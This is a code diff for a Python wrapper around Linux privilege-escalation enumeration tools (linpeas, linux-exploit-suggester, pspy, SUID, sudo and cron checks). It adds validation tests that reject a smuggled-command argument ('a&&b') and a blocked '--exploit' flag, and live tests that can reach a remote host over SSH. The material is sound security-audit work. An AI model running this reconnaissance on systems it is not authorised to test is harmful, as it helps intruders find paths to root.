+        ("PASS — injection in arg &&",  dict(tool="manual",     mode="manual_suid", args=["a&&b"])),
+        ("PASS — blocked flag",         dict(tool="linpeas",    mode="full_audit",  args=["--exploit"])),
+        ("PASS — timeout out of range", dict(tool="manual",     mode="manual_sudo", timeout=5)),
+    ]
+
+    print(f"\n{_sep('═')}")
+    print("  VALIDATION TESTS  (all should fail with error)")
+    print(_sep("═"))
+
+    all_ok = True
+    for label, kwargs in cases:
+        result = linux_privesc_audit(**kwargs)
+        ok     = not result["success"] and bool(result["error"])
+        if not ok:
+            all_ok = False
+        print(f"  {'✅ PASS' if ok else '❌ FAIL'}  {label}")
+        if not ok:
+            print(f"         → unexpected: {json.dumps({k:v for k,v in result.items() if k not in ('raw_output',)}, indent=2)[:300]}")
+
+    print(f"\n  Validation suite: {'all passed ✅' if all_ok else 'FAILURES ❌'}")
+    return all_ok
+
+
+def _run_live_tests() -> None:
+    """
+    Live tests can run either:
+      1) locally (default), or
+      2) remotely via SSH when env vars are provided.
+    """
+    target_ip = os.getenv("PRIVESC_TARGET")
+    ssh_user  = os.getenv("PRIVESC_USERNAME")
+    ssh_pass  = os.getenv("PRIVESC_PASSWORD")
+    ssh_key   = os.getenv("PRIVESC_KEY_PATH")
+
+    use_remote = bool(target_ip)
+    base_args: dict[str, Any] = {}
+
+    if use_remote:
+        if not ssh_user or (not ssh_pass and not ssh_key):
+            print(f"\n{_sep('═')}")
+            print("  LIVE TESTS — remote mode misconfigured")
+            print(_sep("═"))
+            print("  Set PRIVESC_TARGET + PRIVESC_USERNAME and one of:")
+            print("    PRIVESC_PASSWORD or PRIVESC_KEY_PATH")
+            print("  Skipping live tests.")
+            return
+
+        try:
+            with socket.create_connection((target_ip, 22), timeout=3):
+                pass
+        except OSError as exc:
+            print(f"\n{_sep('═')}")
+            print("  LIVE TESTS — remote target unreachable")
+            print(_sep("═"))
+            print(f"  SSH preflight failed for {target_ip}:22 -> {exc}")
+            print("  Skipping live tests.")
+            return
+
+        base_args = {"target": target_ip, "username": ssh_user}
+        if ssh_key:
+            base_args["key_path"] = ssh_key
+        else:
+            base_args["password"] = ssh_pass
+
+    live_cases: list[tuple[str, dict]] = [
+        ("manual_suid  — find / -perm -4000",
+         dict(tool="manual", mode="manual_suid",     timeout=30, **base_args)),
+        ("manual_caps  — getcap -r /",
+         dict(tool="manual", mode="manual_caps",     timeout=30, **base_args)),
+        ("manual_sudo  — sudo -l",
+         dict(tool="manual", mode="manual_sudo",     timeout=30, **base_args)),
+        ("manual_cron  — read all crontabs",
+         dict(tool="manual", mode="manual_cron",     timeout=30, **base_args)),
+        ("manual_env   — PATH hijack check",
+         dict(tool="manual", mode="manual_env",      timeout=30, **base_args)),
+        ("manual_docker — id / docker group",
+         dict(tool="manual", mode="manual_docker",   timeout=30, **base_args)),
+        ("manual_writable — find / -writable",
+         dict(tool="manual", mode="manual_writable", timeout=60, **base_args)),
+        ("linpeas full_audit (needs /tmp/linpeas.sh)",
+         dict(tool="linpeas", mode="full_audit",     timeout=120, **base_args)),
+        ("LES kernel (needs /tmp/linux-exploit-suggester.sh)",
+         dict(tool="linux-exploit-suggester", mode="les_kernel", timeout=60, **base_args)),
+        ("pspy_procs (needs /tmp/pspy64, runs 15s)",
+         dict(tool="pspy", mode="pspy_procs", args=["-p", "-i", "1000"], timeout=30, **base_args)),
+    ]
+
+    # Keep live tests resilient if function signature changes over time.
+    allowed_keys = set(linux_privesc_audit.__code__.co_varnames[:linux_privesc_audit.__code__.co_argcount])
+
+    def _call_audit(kwargs: dict[str, Any]) -> dict[str, Any]:
+        safe_kwargs = {k: v for k, v in kwargs.items() if k in allowed_keys}
+        return linux_privesc_audit(**safe_kwargs)
+
+    print(f"\n{_sep('═')}")
+    if use_remote:
+        print(f"  LIVE TESTS — running on REMOTE target via SSH ({target_ip})")
+    else:
+        print("  LIVE TESTS — running on LOCAL machine")
+    print(_sep("═"))
+
+    for label, kwargs in live_cases:
+        _print_result(label, _call_audit(kwargs))
+
+    # ── Full JSON of manual_suid ───────────────────────────────
+    print(f"\n{_sep('═')}")
+    print("  FULL JSON — manual_suid")
+    print(_sep("═"))
+    r = _call_audit(dict(tool="manual", mode="manual_suid", timeout=30, **base_args))
+    print(json.dumps({k: v for k, v in r.items() if k != "raw_output"}, indent=2))
+
+
+def main() -> None:
+    _run_validation_tests()
+    _run_live_tests()
+
+
 if __name__ == "__main__":
-
-    # ─────────────────────────────
-    # 1. Full linpeas audit
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="linpeas", mode="full_audit")
-    print("=== FULL AUDIT ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 2. SUID/SGID bins only
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="linpeas", mode="suid_sgid")
-    print("=== SUID/SGID ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 3. Sudo misconfiguration check
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="linpeas", mode="sudo_misconfig")
-    print("=== SUDO MISCONFIG ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 4. Cron job enumeration
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="linpeas", mode="cron_jobs")
-    print("=== CRON JOBS ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 5. Dangerous capabilities
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="linpeas", mode="capabilities")
-    print("=== CAPABILITIES ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 6. Docker / LXC group check
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="linpeas", mode="docker_lxc")
-    print("=== DOCKER / LXC ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 7. Kernel CVEs via LES
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="linux-exploit-suggester", mode="les_kernel")
-    print("=== LES KERNEL ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 8. LES with manual kernel override
-    # ─────────────────────────────
-    r = linux_privesc_audit(
-        tool="linux-exploit-suggester",
-        mode="les_extended",
-        args=["--kernel", "5.4.0-89-generic", "--userspace"],
-    )
-    print("=== LES EXTENDED ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 9. pspy — watch all processes
-    # ─────────────────────────────
-    r = linux_privesc_audit(
-        tool="pspy",
-        mode="pspy_procs",
-        args=["-p", "-i", "1000"],
-        timeout=60,
-    )
-    print("=== PSPY PROCS ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 10. pspy — catch cron root jobs
-    # ─────────────────────────────
-    r = linux_privesc_audit(
-        tool="pspy",
-        mode="pspy_cron",
-        args=["-i", "250", "-p", "-f"],
-        timeout=120,
-    )
-    print("=== PSPY CRON ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 11. Manual SUID discovery
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="manual", mode="manual_suid")
-    print("=== MANUAL SUID ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 12. Manual capabilities
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="manual", mode="manual_caps")
-    print("=== MANUAL CAPS ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 13. Manual sudo -l
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="manual", mode="manual_sudo")
-    print("=== MANUAL SUDO ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 14. Manual crontab read
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="manual", mode="manual_cron")
-    print("=== MANUAL CRON ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 15. Docker group check
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="manual", mode="manual_docker")
-    print("=== MANUAL DOCKER ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 16. PATH hijack detection
-    # ─────────────────────────────
-    r = linux_privesc_audit(tool="manual", mode="manual_env")
-    print("=== MANUAL ENV / PATH ===")
-    print(json.dumps(r, indent=2))
-
-    # ─────────────────────────────
-    # 17. linpeas with known password
-    # ─────────────────────────────
-    r = linux_privesc_audit(
-        tool="linpeas",
-        mode="full_audit",
-        args=["-P", "Password123"],
-    )
-    print("=== LINPEAS WITH PASSWORD ===")
-    print(json.dumps(r, indent=2))
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n  Aborted.")
+        sys.exit(0)
